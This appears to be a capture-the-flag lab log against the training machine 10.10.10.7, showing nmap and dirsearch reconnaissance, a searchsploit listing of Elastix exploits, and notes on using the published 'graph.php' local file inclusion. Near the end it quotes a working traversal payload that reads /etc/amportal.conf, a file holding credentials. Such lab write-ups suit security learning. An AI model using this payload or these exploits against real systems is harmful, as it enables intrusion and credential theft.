allenwest1@debian:~$ ping 10.10.10.7
PING 10.10.10.7 (10.10.10.7) 56(84) bytes of data.
64 bytes from 10.10.10.7: icmp_seq=1 ttl=63 time=20.6 ms
64 bytes from 10.10.10.7: icmp_seq=2 ttl=63 time=20.7 ms
^C
--- 10.10.10.7 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 3ms
rtt min/avg/max/mdev = 20.607/20.648/20.690/0.149 ms
allenwest1@debian:~$ nmap -sC -sV 10.10.10.7
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-30 11:05 EDT
Nmap scan report for 10.10.10.7
Host is up (0.026s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: IMPLEMENTATION(Cyrus POP3 server v2) USER EXPIRE(NEVER) STLS AUTH-RESP-CODE PIPELINING UIDL APOP LOGIN-DELAY(0) RESP-CODES TOP
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            874/udp  status
|_  100024  1            877/tcp  status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: IMAP4 UIDPLUS QUOTA RENAME Completed ANNOTATEMORE ID UNSELECT ACL X-NETSCAPE LIST-SUBSCRIBED THREAD=ORDEREDSUBJECT IMAP4rev1 LISTEXT MAILBOX-REFERRALS STARTTLS RIGHTS=kxte LITERAL+ SORT MULTIAPPEND SORT=MODSEQ IDLE THREAD=REFERENCES CATENATE OK CONDSTORE BINARY NAMESPACE NO CHILDREN URLAUTHA0001 ATOMIC
443/tcp   open  ssl/https?
|_ssl-date: 2020-04-30T15:11:07+00:00; +3m26s from scanner time.
|_http-title: Elastix - Login page
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql?
|_mysql-info: ERROR: Script execution failed (use -d to debug)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: mean: 3m25s, deviation: 0s, median: 3m25s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 339.88 seconds
allenwest1@debian:~$ cd Desktop/
allenwest1@debian:~/Desktop$ cd dirsearch/
allenwest1@debian:~/Desktop/dirsearch$ python3 dirsearch.py -w ../directory-list-2.3-medium.txt -e php -f -t 30 -u http://10.10.10.7

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php | HTTP method: get | Threads: 30 | Wordlist size: 441041

Error Log: /home/allenwest1/Desktop/dirsearch/logs/errors-20-04-30_11-10-53.log

Target: http://10.10.10.7

[11:10:53] Starting: 
[11:10:54] 403 -  285B  - /cgi-bin/   
[11:10:54] 200 -   30KB - /icons/      
[11:10:56] 403 -  285B  - /mailman/             
[11:10:57] 200 -  697B  - /pipermail/        
[11:11:08] 403 -  283B  - /error/      
[11:13:09] 200 -   21KB - /register.php/
CTRL+C detected: Pausing threads, please wait...                                      
                                                            
Canceled by the user
.
.
.
// Went to website and found that register.php was a good start
// nothing
// gunna search for explioits based on the info we got on port 443 in the nmap.
// http-title: Elastix - Login page
.
.
.
allenwest1@debian:~/Desktop$ searchsploit elastix
[i] Found (#2): /opt/exploit-database/files_exploits.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /opt/exploit-database/files_shellcodes.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

---------------------------------------------------------------------------------------------------------- -----------------------------------------
 Exploit Title                                                                                            |  Path
                                                                                                          | (/opt/exploit-database/)
---------------------------------------------------------------------------------------------------------- -----------------------------------------
Elastix - 'page' Cross-Site Scripting                                                                     | exploits/php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                   | exploits/php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                             | exploits/php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                          | exploits/php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                         | exploits/php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                        | exploits/php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                    | exploits/php/webapps/18650.py
---------------------------------------------------------------------------------------------------------- -----------------------------------------
Shellcodes: No Result
allenwest1@debian:~/Desktop$ searchsploit -x exploits/php/webapps/37637.pl
[i] Found (#2): /opt/exploit-database/files_exploits.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /opt/exploit-database/files_shellcodes.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

  Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion
      URL: https://www.exploit-db.com/exploits/37637
     Path: /opt/exploit-database/exploits/php/webapps/37637.pl
File Type: ASCII text, with CRLF line terminators


.
.
.
// Important line in this exploit was: (whole file in foundExploit.pl)
// #LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
// pasted after http://10.10.10.7
// got a jumbled page so pressed view page source
// code from there can be found in pageSource.txt


